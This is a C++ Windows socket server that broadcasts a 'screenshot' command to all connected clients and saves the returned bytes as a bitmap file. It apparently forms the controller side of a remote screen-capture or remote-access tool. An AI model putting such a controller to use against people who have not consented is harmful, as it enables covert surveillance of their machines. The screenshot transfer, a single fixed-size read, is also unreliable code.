#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <iostream>
#include <cstring>

#include "Server.h"

#pragma comment(lib, "ws2_32.lib")

Server::Server(int port) : m_port(port), m_serverRunning(true) {
    WSADATA wsData;
    WORD ver = MAKEWORD(2, 2);
    if (WSAStartup(ver, &wsData) != 0) {
        std::cerr << "Can't initialize Winsock! Quitting" << std::endl;
        exit(1);
    }

    m_listeningSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (m_listeningSocket == INVALID_SOCKET) {
        std::cerr << "Can't create a socket! Quitting" << std::endl;
        WSACleanup();
        exit(1);
    }

    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    hint.sin_addr.s_addr = INADDR_ANY;

    if (bind(m_listeningSocket, (sockaddr*)&hint, sizeof(hint)) == SOCKET_ERROR) {
        std::cerr << "Can't bind socket! Quitting" << std::endl;
        closesocket(m_listeningSocket);
        WSACleanup();
        exit(1);
    }

    if (listen(m_listeningSocket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "Can't listen on socket! Quitting" << std::endl;
        closesocket(m_listeningSocket);
        WSACleanup();
        exit(1);
    }
}

Server::~Server() {
    stop();
}

void Server::start() {
    std::thread acceptThread(&Server::acceptClients, this);
    std::thread commandThread(&Server::processCommands, this);
    acceptThread.join();
    commandThread.join();
}

void Server::stop() {
    m_serverRunning = false;

    for (SOCKET sock : m_clientSockets) {
        send(sock, "exit", 4, 0);
        closesocket(sock);
    }

    closesocket(m_listeningSocket);
    WSACleanup();
}

void Server::handleClient(SOCKET clientSocket) {
    char buf[4096];
    while (m_serverRunning) {
        ZeroMemory(buf, 4096);
        int bytesReceived = recv(clientSocket, buf, 4096, 0);
        if (bytesReceived == SOCKET_ERROR) {
            std::cerr << "Error receiving data" << std::endl;
            break;
        }

        if (bytesReceived == 0) {
            std::cout << "Client disconnected" << std::endl;
            break;
        }

        std::cout << "Received: " << std::string(buf, 0, bytesReceived) << std::endl;

        if (std::string(buf, 0, bytesReceived) == "screenshot") {
            std::cout << "Requesting screenshot..." << std::endl;
            char screenshotBuf[8192];
            int screenshotBytesReceived = recv(clientSocket, screenshotBuf, 8192, 0);
            
            FILE* file;
            errno_t err = fopen_s(&file, "screenshot.bmp", "wb");
            if (err != 0) {
                std::cerr << "Error opening file for writing" << std::endl;
                return;
            }
            fwrite(screenshotBuf, sizeof(char), screenshotBytesReceived, file);
            fclose(file);

            std::cout << "Screenshot saved as screenshot.bmp" << std::endl;
        }
    }
    closesocket(clientSocket);
}

void Server::acceptClients() {
    while (m_serverRunning) {
        sockaddr_in client;
        int clientSize = sizeof(client);
        SOCKET clientSocket = accept(m_listeningSocket, (sockaddr*)&client, &clientSize);

        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Invalid client socket" << std::endl;
            continue;
        }

        m_clientSockets.push_back(clientSocket);
        m_clientThreads.emplace_back(&Server::handleClient, this, clientSocket);

        std::cout << "Client connected!" << std::endl;
    }
}

void Server::processCommands() {
    std::string command;
    while (m_serverRunning) {
        std::cout << "Enter command (screenshot): ";
        std::cin >> command;

        if (command == "screenshot") {
            for (SOCKET sock : m_clientSockets) {
                send(sock, command.c_str(), command.size() + 1, 0);
            }
        } else if (command == "exit" || command == "q") {
            stop();
        }
    }
}